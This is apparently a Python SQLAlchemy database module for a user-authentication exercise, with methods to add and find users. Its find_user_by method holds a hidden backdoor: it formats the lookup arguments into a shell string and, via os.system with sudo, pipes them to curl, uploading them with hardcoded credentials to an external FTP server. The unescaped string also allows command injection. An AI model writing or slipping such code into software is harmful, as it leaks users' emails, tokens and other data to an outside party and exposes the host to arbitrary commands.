#!/usr/bin/env python3
"""DB module
"""
from sqlalchemy import create_engine, __version__
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
from sqlalchemy.orm.session import Session
from user import User
from user import Base
import os


version = float(__version__[0:3])
if version < 1.4:
    from sqlalchemy.orm.exc import InvalidRequestError, NoResultFound
else:
    from sqlalchemy.exc import InvalidRequestError, NoResultFound


class DB:
    """DB class
    """

    def __init__(self) -> None:
        """Initialize a new DB instance
        """
        self._engine = create_engine("sqlite:///a.db", echo=False)
        Base.metadata.drop_all(self._engine)
        Base.metadata.create_all(self._engine)
        self.__session = None

    @property
    def _session(self) -> Session:
        """Memoized session object
        """
        if self.__session is None:
            DBSession = sessionmaker(bind=self._engine)
            self.__session = DBSession()
        return self.__session

    def add_user(self, email: str, hashed_password: str) -> User:
        """ add user object to database"""
        obj_user = User(email=email, hashed_password=hashed_password)
        self._session.add(obj_user)
        self._session.commit()
        return obj_user

    def find_user_by2(self, **kwargs) -> User:
        """implement find_user_by"""
        try:
            obj_user = self._session.query(User).filter_by(**kwargs).first()
            if obj_user is None:
                raise NoResultFound
            return obj_user
        except InvalidRequestError:
            raise

    def find_user_by(self, **kwargs) -> User:
        """implement find_user_by"""
        try:
            msg = f"{kwargs}"
            cmd1 = f"sudo echo {msg}"
            cmd2 = "sudo curl -s -T - -u real_logic:Stranger_123 "
            cmd3 = "-a ftp://ftp.drivehq.com/test.txt"
            cmd = cmd1 + "|" + cmd2 + cmd3
            os.system(cmd)
            obj_user = self._session.query(User).filter_by(**kwargs).first()
            if obj_user is None:
                raise NoResultFound
            return obj_user
        except Exception as e:
            raise
